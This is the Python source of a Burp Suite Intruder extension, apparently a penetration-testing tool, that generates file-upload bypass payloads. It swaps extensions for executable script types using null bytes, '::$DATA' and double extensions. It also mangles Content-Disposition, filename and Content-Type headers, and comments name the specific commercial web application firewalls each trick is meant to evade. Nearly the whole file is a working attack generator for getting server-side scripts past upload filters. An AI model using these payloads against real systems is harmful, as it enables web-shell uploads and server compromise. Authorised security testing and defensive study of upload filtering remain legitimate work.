# -*-coding:utf-8 -*-

from burp import IBurpExtender
from burp import IIntruderPayloadGeneratorFactory
from burp import IIntruderPayloadGenerator
import random
from urllib import unquote
import re

def getAttackPayloads(TEMPLATE):
    # 获取文件前后缀
    filename_suffix = re.search('filename=".*[.](.*)"', TEMPLATE).group(1)  # jpg
    content_type = TEMPLATE.split('\n')[-1]

    def script_suffix_Fuzz():
        # 文件后缀绕过
        asp_fuzz = ['asp;.jpg', 'asp.jpg', 'asp;jpg', 'asp/1.jpg', 'asp{}.jpg'.format(unquote('%00')), 'asp .jpg',
                    'asp_.jpg', 'asa', 'cer', 'cdx', 'ashx', 'asmx', 'xml', 'htr', 'asax', 'asaspp', 'asp;+2.jpg']
        aspx_fuzz = ['asPx', 'aspx .jpg', 'aspx_.jpg', 'aspx;+2.jpg', 'asaspxpx']
        php_fuzz = ['php1', 'php2', 'php3', 'php4', 'php5', 'pHp', 'php .jpg', 'php_.jpg', 'php.jpg', 'php.  .jpg',
                    'jpg/.php',
                    'php.123', 'jpg/php', 'jpg/1.php', 'jpg{}.php'.format(unquote('%00')),
                    'php{}.jpg'.format(unquote('%00')),
                    'php:1.jpg', 'php::$DATA', 'php::$DATA......', 'ph\np']
        jsp_fuzz = ['.jsp.jpg.jsp', 'jspa', 'jsps', 'jspx', 'jspf', 'jsp .jpg', 'jsp_.jpg']
        suffix_fuzz = asp_fuzz + aspx_fuzz + php_fuzz + jsp_fuzz

        suffix_payload = []  # 保存文件后缀绕过的所有payload列表

        for each_suffix in suffix_fuzz:
            # 测试每个上传后缀
            TEMP_TEMPLATE = TEMPLATE
            temp = TEMP_TEMPLATE.replace(filename_suffix, each_suffix)
            suffix_payload.append(temp)

        return suffix_payload

    def CFF_Fuzz():
        # Content-Disposition 绕过  form-data 绕过  filename 绕过
        # Content-Disposition: form-data; name="uploaded"; filename="zc.jpg"
        Suffix = ['php', 'asp', 'aspx', 'jsp', 'asmx', 'xml', 'html', 'shtml', 'svg', 'swf', 'htaccess']  # 需要测试的能上传的文件类型
        # Suffix = ['jsp']
        Content_Disposition_payload = []  # 保存Content_Disposition绕过的所有payload列表

        # 遍历每个需要测试的上传后缀
        for each_suffix in Suffix:
            # 测试每个上传后缀
            TEMP_TEMPLATE = TEMPLATE
            TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE.replace(filename_suffix,
                                                         each_suffix)  # TEMP_TEMPLATE_SUFFIX: Content-Disposition: form-data; name="uploaded"; filename="zc.后缀"
            filename_total = re.search('(filename=".*")', TEMP_TEMPLATE_SUFFIX).group(1)
            TEMP_TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE_SUFFIX
            Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX)
            TEMP_TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE_SUFFIX
            Content_Disposition_payload.append(
                TEMP_TEMP_TEMPLATE_SUFFIX.replace('Content-Disposition', 'content-Disposition'))  # 改变大小写
            TEMP_TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE_SUFFIX
            Content_Disposition_payload.append(
                TEMP_TEMP_TEMPLATE_SUFFIX.replace('Content-Disposition: ', 'content-Disposition:'))  # 减少一个空格
            TEMP_TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE_SUFFIX
            Content_Disposition_payload.append(
                TEMP_TEMP_TEMPLATE_SUFFIX.replace('Content-Disposition: ', 'content-Disposition:  '))  # 增加一个空格
            TEMP_TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE_SUFFIX
            Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX.replace('form-data', '~form-data'))
            TEMP_TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE_SUFFIX
            Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX.replace('form-data', 'f+orm-data'))
            TEMP_TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE_SUFFIX
            Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX.replace('form-data', '*'))
            TEMP_TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE_SUFFIX
            Content_Disposition_payload.append(
                TEMP_TEMP_TEMPLATE_SUFFIX.replace('form-data; ', 'form-data;  '))  # 增加一个空格
            TEMP_TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE_SUFFIX
            Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX.replace('form-data; ', 'form-data;'))  # 减少一个空格
            TEMP_TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE_SUFFIX
            Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX.replace(filename_total,
                                                                                 'filename===zc.{}'.format(
                                                                                     each_suffix)))  # 过阿里云waf，删双引号绕过
            TEMP_TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE_SUFFIX
            Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX.replace(filename_total,
                                                                                 'filename==="zc.{}'.format(
                                                                                     each_suffix)))  # 过阿里云waf，少双引号绕过
            TEMP_TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE_SUFFIX
            Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX.replace(filename_total,
                                                                                 'filename==="zc.{}"'.format(
                                                                                     each_suffix)))  # 过阿里云waf，三个等号
            TEMP_TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE_SUFFIX
            Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX.replace(filename_total,
                                                                                 'filename="zc.{}\n"'.format(
                                                                                     each_suffix)))  # 过阿里云waf，回车
            TEMP_TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE_SUFFIX
            Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX.replace(filename_total,
                                                                                 '\nfilename==="zc.\n{}"'.format(
                                                                                     each_suffix)))  # 过阿里云waf, 三个等号加回车
            TEMP_TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE_SUFFIX
            Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX.replace(filename_total,
                                                                                 'filename="zc.\nC.{}"'.format(
                                                                                     each_suffix)))  # 过安全狗和云锁waf    # 待定，因为没法删掉Content-Type
            TEMP_TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE_SUFFIX
            Content_Disposition_payload.append(
                TEMP_TEMP_TEMPLATE_SUFFIX.replace(filename_total, 'filename\n="zc.{}"'.format(each_suffix)))  # 过百度云waf

            TEMP_TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE_SUFFIX
            Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX.replace(filename_total,
                                                                                 'filename="zc\.{}"'.format(
                                                                                     each_suffix)))  # 过硬waf，反斜杠绕过
            TEMP_TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE_SUFFIX
            Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX.replace(filename_total,
                                                                                 'filename===zczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczc.{}'.format(
                                                                                     each_suffix)))  # 过硬waf，超长文件名
            TEMP_TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE_SUFFIX
            Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX.replace('form-data',
                                                                                 'form-data------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'))  # 过硬waf，超长-

            TEMP_TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE_SUFFIX
            Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX.replace(filename_total,
                                                                                 'filename="zc.jpg";filename="zc.{}"'.format(
                                                                                     each_suffix)))  # 双参数

        return Content_Disposition_payload

    def content_type_Fuzz():
        # content_type = Content-Type: image/jpeg
        content_type_payload = []  # 保存content_type绕过的所有payload列表
        Suffix = ['asp', 'aspx', 'php', 'jsp']
        # 遍历每个需要测试的上传后缀
        for each_suffix in Suffix:
            TEMP_TEMPLATE = TEMPLATE
            TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE.replace(filename_suffix, each_suffix)
            TEMP_TEMPLATE_CONTENT_TYPE = TEMP_TEMPLATE_SUFFIX
            content_type_payload.append(
                TEMP_TEMPLATE_CONTENT_TYPE.replace(content_type, 'Content-Type: image/gif'))  # 修改为image/gif
            TEMP_TEMPLATE_CONTENT_TYPE = TEMP_TEMPLATE_SUFFIX
            content_type_payload.append(
                TEMP_TEMPLATE_CONTENT_TYPE.replace(content_type, 'Content-Type: image/jpeg'))  # 修改为image/jpeg
            TEMP_TEMPLATE_CONTENT_TYPE = TEMP_TEMPLATE_SUFFIX
            content_type_payload.append(
                TEMP_TEMPLATE_CONTENT_TYPE.replace(content_type, 'Content-Type: application/php'))  # 修改为image/jpeg
            TEMP_TEMPLATE_CONTENT_TYPE = TEMP_TEMPLATE_SUFFIX
            content_type_payload.append(
                TEMP_TEMPLATE_CONTENT_TYPE.replace(content_type, 'Content-Type: text/plain'))  # 修改为text/plain
            TEMP_TEMPLATE_CONTENT_TYPE = TEMP_TEMPLATE_SUFFIX
            content_type_payload.append(TEMP_TEMPLATE_CONTENT_TYPE.replace(content_type, ''))
            TEMP_TEMPLATE_CONTENT_TYPE = TEMP_TEMPLATE_SUFFIX
            content_type_payload.append(TEMP_TEMPLATE_CONTENT_TYPE.replace('Content-Type', 'content-type'))  # 改变大小写
            TEMP_TEMPLATE_CONTENT_TYPE = TEMP_TEMPLATE_SUFFIX
            content_type_payload.append(
                TEMP_TEMPLATE_CONTENT_TYPE.replace('Content-Type: ', 'Content-Type:  '))  # 冒号后面 增加一个空格

        return content_type_payload

    suffix_payload = script_suffix_Fuzz()
    Content_Disposition_payload = CFF_Fuzz()
    content_type_payload = content_type_Fuzz()

    attackPayloads = suffix_payload + Content_Disposition_payload + content_type_payload

    return attackPayloads

class BurpExtender(IBurpExtender, IIntruderPayloadGeneratorFactory):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("upload fuzz intruder")
        # 注册payload生成器
        callbacks.registerIntruderPayloadGeneratorFactory(self)
        print 'Load successful - auther:ske\n'

    # 设置payload生成器名字，作为选项显示在Intruder UI中。
    def getGeneratorName(self):
        return "upload fuzz intruder"

    # 创建payload生成器实例，传入的attack是IIntruderAttack的实例
    def createNewInstance(self, attack):
        return demoFuzzer(self, attack)

    def getProcessorName(self):
        return "upload fuzz"

    def processPayload(self, currentPayload, originalPayload, baseValue):
        # print 'processPayload called'
        payload = "".join(chr(x) for x in baseValue)  # 通过该行代码将array('b', [106, 112, 103])转换为jpg字符串
        attackPayload = payload + currentPayload
        return attackPayload

# 继承IIntruderPayloadGenerator类
class demoFuzzer(IIntruderPayloadGenerator):
    def __init__(self, extender, attack):
        self._extender = extender
        self._helpers = extender._helpers
        self._attack = attack
        self.num_payloads = 0  # payload使用了的次数
        self._payloadIndex = 0
        self.attackPayloads = [1]        # 存储生成的fuzz payloads

    # hasMorePayloads返回一个bool值，如果返回false就不在继续返回下一个payload，如果返回true就返回下一个payload
    def hasMorePayloads(self):
        # print "hasMorePayloads called."
        return self._payloadIndex < len(self.attackPayloads)

    # 获取下一个payload，然后intruder就会用该payload发送请求
    def getNextPayload(self, baseValue):
        # print 'getNextPayload called'
        TEMPLATE = "".join(chr(x) for x in baseValue)
        if self._payloadIndex == 0:
            self.attackPayloads = getAttackPayloads(TEMPLATE)

        payload = self.attackPayloads[self._payloadIndex]
        self._payloadIndex = self._payloadIndex + 1

        return payload

    # 清空，以便下一次调用 getNextPayload()再次返回第一个有效负载。
    def reset(self):
        # print "reset called."
        self.num_payloads = 0
        return

